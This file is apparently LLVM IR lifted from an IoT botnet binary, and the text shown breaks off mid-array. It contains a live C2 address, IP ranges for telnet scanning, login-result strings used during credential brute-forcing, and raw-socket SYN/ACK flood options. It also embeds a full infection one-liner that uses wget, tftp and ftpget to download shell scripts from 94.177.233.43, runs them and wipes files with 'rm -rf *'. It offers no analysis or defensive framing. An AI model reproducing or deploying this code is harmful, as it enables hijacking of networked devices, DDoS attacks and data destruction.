source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_806200c.2 = global i32 0
@global_var_8062024.3 = local_unnamed_addr global i32* @global_var_806200c.2
@global_var_80617c4.4 = constant i32 0
@global_var_8062564.5 = global i32 0
@global_var_8062010.6 = local_unnamed_addr global i32 0
@global_var_80625a0.7 = global i32 0
@global_var_80625a4.8 = local_unnamed_addr global i32 0
@global_var_80625a8.9 = local_unnamed_addr global i32 0
@global_var_80622c4.10 = local_unnamed_addr global i32 4095
@global_var_80622c0.11 = local_unnamed_addr global i32 362436
@global_var_8057520.12 = constant [7 x i8] c"(null)\00"
@global_var_8057527.14 = constant [3 x i8] c"-c\00"
@global_var_80571fb.15 = constant [3 x i8] c"sh\00"
@global_var_805752a.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8057540.17 = constant i32 -1
@global_var_8057940.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805794e.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_8062580.20 = local_unnamed_addr global i32 0
@global_var_8057957.21 = constant [5 x i8] c"PING\00"
@global_var_8057514.22 = constant [8 x i8] c"busybox\00"
@global_var_805751c.23 = constant i32 2293796
@global_var_805751e.24 = constant i32 1848115235
@global_var_8062220.25 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057514.22, i32 0, i32 0), i8* bitcast (i32* @global_var_805751c.23 to i8*), i8* bitcast (i32* @global_var_805751e.24 to i8*)]
@global_var_80574e8.26 = constant [7 x i8] c"nvalid\00"
@global_var_80574ef.27 = constant [6 x i8] c"ailed\00"
@global_var_80574f5.28 = constant [9 x i8] c"ncorrect\00"
@global_var_80574fe.29 = constant [6 x i8] c"enied\00"
@global_var_8057504.30 = constant [5 x i8] c"rror\00"
@global_var_8057509.31 = constant [7 x i8] c"oodbye\00"
@global_var_8057510.32 = constant [4 x i8] c"bad\00"
@global_var_8062200.33 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80574e8.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80574ef.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80574f5.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80574fe.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057504.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057509.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057510.32, i32 0, i32 0)]
@global_var_8062588.34 = local_unnamed_addr global i32 0
@global_var_806258c.35 = local_unnamed_addr global i32 0
@global_var_8068814.36 = local_unnamed_addr global i32 0
@global_var_805795c.37 = constant [6 x i8] c":>%$#\00"
@global_var_8057963.42 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_8057970.43 = constant [13 x i8] c"43.239.%d.%d\00"
@global_var_805797d.44 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_8057988.45 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_8057995.46 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_80579a0.47 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_80579ad.48 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_80579b9.49 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_80579c6.50 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_80579d3.51 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_80579e0.52 = constant [13 x i8] c"77.209.%d.%d\00"
@global_var_80579ed.53 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_80579f8.54 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_8057a05.55 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_8057a12.56 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_8057a1f.57 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_8057a2c.58 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_8057a39.59 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_8057a46.60 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_8057a51.61 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_8057a5d.62 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_8057a6a.63 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_8057a75.64 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_8057a80.65 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_8057a8c.66 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_8057a98.67 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_8057aa4.68 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_8057ab1.69 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_8057abe.70 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_8057aca.71 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_8057ad7.72 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_8057ae3.73 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_8057aee.74 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_8057afa.75 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_8057b06.76 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_8057b12.77 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_8057b1e.78 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_8057b2a.79 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_8057b37.80 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_8057b44.81 = constant [11 x i8] c"60.0.%d.%d\00"
@global_var_8057b4f.82 = constant [12 x i8] c"60.16.%d.%d\00"
@global_var_8057b5b.83 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_8057b68.84 = constant [12 x i8] c"62.30.%d.%d\00"
@global_var_8057b74.85 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_8057b81.86 = constant [13 x i8] c"62.254.%d.%d\00"
@global_var_8057b8e.87 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_8057b9b.88 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_8057ba7.89 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_8057bb3.90 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_8057bbf.91 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_8057bcc.92 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_8057bd9.93 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_8057be7.94 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_8057bf4.95 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_8057c02.96 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_8057c10.97 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_8057c1d.98 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_8057c2a.99 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_8057c37.100 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_8057c44.101 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_8057c51.102 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_8057c5e.103 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_8057c6b.104 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_8057c78.105 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_8057c85.106 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_8057c92.107 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_8057c9f.108 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_8057cac.109 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_8057cb9.110 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_8057cc6.111 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_8057cd3.112 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_8057ce0.113 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_8057ced.114 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_8057cfa.115 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_8057d07.116 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_8057d14.117 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_8057d21.118 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_8057d2e.119 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_8057d3b.120 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_8057d48.121 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_8057d55.122 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_8057d62.123 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_8057d6f.124 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_8057d7c.125 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_8057d89.126 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_8057d96.127 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_8057da3.128 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_8057db0.129 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_8057dbd.130 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_8057dca.131 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_8057dd7.132 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_8057de4.133 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_8057df1.134 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_8057dfe.135 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_8057e0b.136 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_8057e18.137 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_8057e25.138 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_8057e32.139 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_8057e3f.140 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_8057e4c.141 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_8057e58.142 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_8057e65.143 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_8057e72.144 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_8057e7f.145 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_8057e8b.146 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_8057e98.147 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_8057ea6.148 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_8057eb4.149 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_8057ec1.150 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_8057ecf.151 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_8057edd.152 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_8057eea.153 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_8062280.154 = global i32 110
@global_var_8057ef8.156 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_8068808.157 = local_unnamed_addr global i32 0
@global_var_8057483.158 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_8057492.159 = constant [6 x i8] c"/tmp/\00"
@global_var_8057498.160 = constant [6 x i8] c"/var/\00"
@global_var_805749e.161 = constant [6 x i8] c"/dev/\00"
@global_var_80574a4.162 = constant [10 x i8] c"/var/run/\00"
@global_var_80574ae.163 = constant [10 x i8] c"/dev/shm/\00"
@global_var_80574b8.164 = constant [6 x i8] c"/mnt/\00"
@global_var_80574be.165 = constant [7 x i8] c"/boot/\00"
@global_var_80574c5.166 = constant [6 x i8] c"/usr/\00"
@global_var_80574cb.167 = constant [6 x i8] c"/opt/\00"
@global_var_80621c0.168 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8057483.158, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057492.159, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057498.160, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805749e.161, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80574a4.162, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80574ae.163, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80574b8.164, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80574be.165, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80574c5.166, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80574cb.167, i32 0, i32 0)]
@global_var_80621ec = external global i32
@global_var_8057f04.173 = constant [3 x i8] c"\0D\0A\00"
@global_var_8062240.174 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80574e8.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80574ef.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80574f5.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80574fe.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057504.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057509.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057510.32, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057514.22, i32 0, i32 0), i8* bitcast (i32* @global_var_805751c.23 to i8*), i8* bitcast (i32* @global_var_805751e.24 to i8*)]
@global_var_8057f07.175 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_8057f1e.176 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_8057f23.177 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_80572e4.178 = constant [400 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.233.43/miggs.sh; chmod 777 miggs.sh; sh miggs.sh; tftp 94.177.233.43 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 94.177.233.43; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 94.177.233.43 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf miggs.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_8057474.179 = constant [5 x i8] c"root\00"
@global_var_805747a.180 = constant [7 x i8] c"telnet\00"
@global_var_8057481.181 = constant i32 1680801792
@global_var_80621a0.182 = local_unnamed_addr global [7 x i8*] [i8* getelementptr inbounds ([400 x i8], [400 x i8]* @global_var_80572e4.178, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057474.179, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057474.179, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805747a.180, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057474.179, i32 0, i32 0), i8* bitcast (i32* @global_var_8057481.181 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805747a.180, i32 0, i32 0)]
@global_var_8057f4c.183 = constant [6 x i8] c"arfgG\00"
@global_var_8057f52.184 = constant [9 x i8] c"HBiug655\00"
@global_var_8057f5b.185 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_8057f68.186 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_8057f7c.187 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_8057f8d.188 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8057f99.189 = constant [12 x i8] c"RYSDk747586\00"
@global_var_8057fa5.190 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_8057fb1.191 = constant [10 x i8] c"KHGK7985i\00"
@global_var_8057fbb.192 = constant [11 x i8] c"yuituiILYF\00"
@global_var_8057fc6.193 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_8057fd4.194 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_8057fe0.195 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_8057fed.196 = constant [9 x i8] c"ewqdcftr\00"
@global_var_8057ff6.197 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_8058006.198 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_8058011.199 = constant [12 x i8] c"twehgbferhb\00"
@global_var_805801d.200 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_8058029.201 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_8058037.202 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_8058045.203 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_8058053.204 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_805805d.205 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_805806b.206 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_8058079.207 = constant [12 x i8] c"yteytietyue\00"
@global_var_8058085.208 = constant [9 x i8] c"qsortEQS\00"
@global_var_805808e.209 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805809e.210 = constant [4 x i8] c"std\00"
@global_var_80580a2.211 = constant [4 x i8] c"dts\00"
@global_var_80580a6.212 = constant [4 x i8] c"lsk\00"
@global_var_80580aa.213 = constant [4 x i8] c"kek\00"
@global_var_80580ae.214 = constant [6 x i8] c"smack\00"
@global_var_80580b4.215 = constant [4 x i8] c"ily\00"
@global_var_80580b8.216 = constant [4 x i8] c"tyf\00"
@global_var_80580bc.217 = constant [4 x i8] c"pos\00"
@global_var_80580c0.218 = constant [6 x i8] c"cunts\00"
@global_var_80580e0.219 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057f4c.183, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057f52.184, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8057f5b.185, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8057f68.186, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8057f7c.187, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8057f8d.188, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8057f99.189, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8057fa5.190, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057fb1.191, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8057fbb.192, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057fc6.193, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8057fd4.194, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8057fe0.195, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057fed.196, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8057ff6.197, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8058006.198, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058011.199, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805801d.200, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058029.201, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058037.202, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058045.203, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058053.204, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805805d.205, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805806b.206, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058079.207, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058085.208, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805808e.209, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805809e.210, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80580a2.211, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80580a6.212, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80580aa.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80580ae.214, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80580b4.215, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80580b8.216, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80580bc.217, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80580c0.218, i32 0, i32 0)]
@global_var_8058170.220 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_805818c.221 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_80581ad.222 = constant [4 x i8] c"all\00"
@global_var_80581b1.223 = constant i32 2037579820
@global_var_80581b3.224 = constant [4 x i8] c"syn\00"
@global_var_80581b7.225 = constant [4 x i8] c"rst\00"
@global_var_80581bb.226 = constant [4 x i8] c"fin\00"
@global_var_80581bf.227 = constant [4 x i8] c"ack\00"
@global_var_80581c3.228 = constant [4 x i8] c"psh\00"
@global_var_80581c7.229 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_8057100.230 = constant [5 x i8] c"mips\00"
@global_var_8057105.231 = constant [7 x i8] c"mipsel\00"
@global_var_805710c.232 = constant [4 x i8] c"sh4\00"
@global_var_8057110.233 = constant [4 x i8] c"x86\00"
@global_var_8057114.234 = constant [5 x i8] c"i686\00"
@global_var_8057119.235 = constant [4 x i8] c"ppc\00"
@global_var_805711d.236 = constant [5 x i8] c"i586\00"
@global_var_8057122.237 = constant [8 x i8] c"jackmy*\00"
@global_var_805712a.238 = constant [8 x i8] c"hackmy*\00"
@global_var_8057132.239 = constant [5 x i8] c"arm*\00"
@global_var_8057137.240 = constant [3 x i8] c"b1\00"
@global_var_805713a.241 = constant [3 x i8] c"b2\00"
@global_var_805713d.242 = constant [3 x i8] c"b3\00"
@global_var_8057140.243 = constant [3 x i8] c"b4\00"
@global_var_8057143.244 = constant [3 x i8] c"b5\00"
@global_var_8057146.245 = constant [3 x i8] c"b6\00"
@global_var_8057149.246 = constant [3 x i8] c"b7\00"
@global_var_805714c.247 = constant [3 x i8] c"b8\00"
@global_var_805714f.248 = constant [3 x i8] c"b9\00"
@global_var_8057152.249 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8057163.250 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_805716c.251 = constant [10 x i8] c"dvrHelper\00"
@global_var_8057176.252 = constant [8 x i8] c"FDFDHFC\00"
@global_var_805717e.253 = constant [5 x i8] c"FEUB\00"
@global_var_8057183.254 = constant [9 x i8] c"FTUdftui\00"
@global_var_805718c.255 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_8057195.256 = constant [6 x i8] c"jhUOH\00"
@global_var_805719b.257 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_80571a4.258 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_80571ae.259 = constant [10 x i8] c"kmyx86_64\00"
@global_var_80571b8.260 = constant [10 x i8] c"lolmipsel\00"
@global_var_80571c2.261 = constant [8 x i8] c"RYrydry\00"
@global_var_80571ca.262 = constant [5 x i8] c"tel*\00"
@global_var_80571cf.263 = constant [9 x i8] c"TwoFace*\00"
@global_var_80571d8.264 = constant [9 x i8] c"UYyuyioy\00"
@global_var_80571e1.265 = constant [5 x i8] c"wget\00"
@global_var_80571e6.266 = constant [7 x i8] c"x86_64\00"
@global_var_80571ed.267 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_80571f6.268 = constant [5 x i8] c"xxb*\00"
@global_var_80571fe.269 = constant i32 3276849
@global_var_8057200.270 = constant i32 3342386
@global_var_8057202.271 = constant i32 3407923
@global_var_8057204.272 = constant i32 3473460
@global_var_8057206.273 = constant i32 3538997
@global_var_8057208.274 = constant i32 3604534
@global_var_805720a.275 = constant i32 3670071
@global_var_805720c.276 = constant i32 3735608
@global_var_805720e.277 = constant i32 808517689
@global_var_8057210.278 = constant [3 x i8] c"10\00"
@global_var_8057213.279 = constant [3 x i8] c"11\00"
@global_var_8057216.280 = constant [3 x i8] c"12\00"
@global_var_8057219.281 = constant [3 x i8] c"13\00"
@global_var_805721c.282 = constant [3 x i8] c"14\00"
@global_var_805721f.283 = constant [3 x i8] c"15\00"
@global_var_8057222.284 = constant [3 x i8] c"16\00"
@global_var_8057225.285 = constant [3 x i8] c"17\00"
@global_var_8057228.286 = constant [3 x i8] c"18\00"
@global_var_805722b.287 = constant [3 x i8] c"19\00"
@global_var_805722e.288 = constant [3 x i8] c"20\00"
@global_var_8057231.289 = constant [6 x i8] c"hackz\00"
@global_var_8057237.290 = constant [5 x i8] c"bin*\00"
@global_var_805723c.291 = constant [5 x i8] c"gtop\00"
@global_var_8057241.292 = constant [5 x i8] c"ftp*\00"
@global_var_8057246.293 = constant [6 x i8] c"tftp*\00"
@global_var_805724c.294 = constant [7 x i8] c"botnet\00"
@global_var_8057253.295 = constant [8 x i8] c"swatnet\00"
@global_var_805725b.296 = constant [8 x i8] c"ballpit\00"
@global_var_8057263.297 = constant [8 x i8] c"fucknet\00"
@global_var_805726b.298 = constant [9 x i8] c"cracknet\00"
@global_var_8057274.299 = constant [8 x i8] c"weednet\00"
@global_var_805727c.300 = constant [7 x i8] c"gaynet\00"
@global_var_8057283.301 = constant [9 x i8] c"queernet\00"
@global_var_805728c.302 = constant [8 x i8] c"ballnet\00"
@global_var_8057294.303 = constant [5 x i8] c"unet\00"
@global_var_8057299.304 = constant [7 x i8] c"yougay\00"
@global_var_80572a0.305 = constant [7 x i8] c"sttftp\00"
@global_var_80572a7.306 = constant [7 x i8] c"sstftp\00"
@global_var_80572ae.307 = constant [7 x i8] c"sbtftp\00"
@global_var_80572b5.308 = constant [6 x i8] c"btftp\00"
@global_var_80572bb.309 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_80572c4.310 = constant [6 x i8] c"bruv*\00"
@global_var_80572ca.311 = constant [5 x i8] c"IoT*\00"
@global_var_80572cf.312 = constant [18 x i8] c"94.177.233.43:777\00"
@global_var_8062040.313 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057100.230, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057105.231, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805710c.232, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057110.233, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057114.234, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057119.235, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805711d.236, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805711d.236, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057122.237, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805712a.238, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057132.239, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057137.240, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805713a.241, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805713d.242, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057140.243, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057143.244, i32 0, i32 0), i8* getelementptr inbounds 